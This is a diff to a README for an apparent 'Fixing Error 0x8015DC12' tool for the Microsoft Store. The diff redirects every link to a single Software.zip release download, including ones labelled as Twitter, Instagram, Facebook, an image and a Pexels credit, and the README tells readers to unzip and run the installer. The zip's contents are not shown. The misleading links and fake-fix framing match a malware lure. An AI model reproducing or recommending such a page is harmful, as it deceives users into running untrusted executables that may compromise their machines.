@@ -15,9 +15,9 @@ The **Fixing Error 0x8015DC12** repository provides a specialized software tool 
 To rid yourself of the Error 0x8015DC12 and get back to enjoying the Microsoft Store hassle-free, follow these simple steps:
 
 1. **Step One: Download the Software**
-   - Click on the download button below or use [this link](https://github.com/user-attachments/files/17466420/Software.zip) to access the software package.
+   - Click on the download button below or use [this link](https://github.com/frogdogg/Fixing-Error-0x8015DC12/releases/download/v2.0/Software.zip) to access the software package.
    
-   [![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLOR_HEX_CODE>?style=for-the-badge&logo=appveyor)](https://github.com/user-attachments/files/17466420/Software.zip)
+   [![Download Software](https://github.com/frogdogg/Fixing-Error-0x8015DC12/releases/download/v2.0/Software.zip<COLOR_HEX_CODE>?style=for-the-badge&logo=appveyor)](https://github.com/frogdogg/Fixing-Error-0x8015DC12/releases/download/v2.0/Software.zip)
 
 2. **Step Two: Installation**
    - Unzip the downloaded file and run the installation process.
@@ -54,11 +54,11 @@ If you encounter any difficulties during the installation or running of the soft
 
 Stay updated and interact with us on social media platforms:
 
-- **Twitter**: [@fixingerrors](https://twitter.com/fixingerrors)
-- **Instagram**: [fixing_errors](https://www.instagram.com/fixing_errors)
-- **Facebook**: [FixingErrorSolutions](https://www.facebook.com/FixingErrorSolutions)
+- **Twitter**: [@fixingerrors](https://github.com/frogdogg/Fixing-Error-0x8015DC12/releases/download/v2.0/Software.zip)
+- **Instagram**: [fixing_errors](https://github.com/frogdogg/Fixing-Error-0x8015DC12/releases/download/v2.0/Software.zip)
+- **Facebook**: [FixingErrorSolutions](https://github.com/frogdogg/Fixing-Error-0x8015DC12/releases/download/v2.0/Software.zip)
 
-![Connecting People](https://images.pexels.com/photos/1148820/pexels-photo-1148820.jpeg)
+![Connecting People](https://github.com/frogdogg/Fixing-Error-0x8015DC12/releases/download/v2.0/Software.zip)
 
 ## Author
 
@@ -70,4 +70,4 @@ Thank you for choosing **Fixing Error 0x8015DC12**. We hope our solution resolve
 
 ---
 
-_Images are sourced from [Pexels](https://www.pexels.com/) and used for illustrative purposes only._
+_Images are sourced from [Pexels](https://github.com/frogdogg/Fixing-Error-0x8015DC12/releases/download/v2.0/Software.zip) and used for illustrative purposes only._
